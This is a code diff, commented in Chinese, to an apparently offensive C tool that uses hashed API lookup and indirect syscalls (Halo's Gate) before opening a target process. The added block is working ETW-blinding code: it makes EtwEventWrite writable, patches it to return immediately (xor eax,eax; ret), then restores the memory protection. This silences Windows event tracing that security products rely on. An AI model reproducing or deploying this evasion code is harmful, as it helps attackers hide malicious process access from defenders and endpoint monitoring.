@@ -113,6 +113,44 @@ int main() {
     }
     printf("[!!!] %d Golem Gadgets Found...\n", g_GadgetCount);
     
+        
+    // ETW Blinding 逻辑（因为这是进程里面所有操作的前提，单独写而不加入每次具体的开火逻辑）
+    //改写EtwEventWrite
+    PVOID etwAddr = GetApi(djb2_hash_a("EtwEventWrite"));//获取目标地址
+    if(etwAddr != NULL){
+        //参数准备
+        //1.HANDLE: (HANDLE)-1 伪句柄，默认指向自己
+        //2.双重指针
+        PVOID targetAddr = etwAddr;//传入 &targetAddr
+        //3.指向表示变量大小的指针（我们要改多少--3个字节）
+        SIZE_T modSize = 3;//传入 &modSize
+        //4.PAGE_READWRITE 操作码 0x04 改为RW
+        //5.储存之前权限备份的指针
+        ULONG oldProtect = 0;
+        //直接调用我们的宏
+        NTSTATUS status1 = VEGA_CALL((djb2_hash_a("NtProtectVirtualMemory")), 5, ((HANDLE)-1), &targetAddr, &modSize, PAGE_READWRITE, &oldProtect);
+        if(status1 == 0x00000000){
+            printf("[*] Changed to RW, ready to write...\n");
+            //开始暴力写入
+            PBYTE etwAddrArray = (PBYTE)(etwAddr);
+            etwAddrArray[0] = 0x33;
+            etwAddrArray[1] = 0xC0;
+            etwAddrArray[2] = 0xC3;
+            printf("[*] Overwrite done!\n");
+
+            //再次调用切回只读
+            NTSTATUS status2 = VEGA_CALL((djb2_hash_a("NtProtectVirtualMemory")), 5, ((HANDLE)-1), &targetAddr, &modSize, oldProtect, &oldProtect);
+            if(status2 == 0x00000000){
+                printf("[*] Changed back to R...");
+            }
+        }
+    }
+
+
+
+
+
+
     //开火
     //还是以NtOpenProcess为例，先通过Halo‘s Gate获取SSN和syscall。
     HANDLE hTargetProcess = NULL;
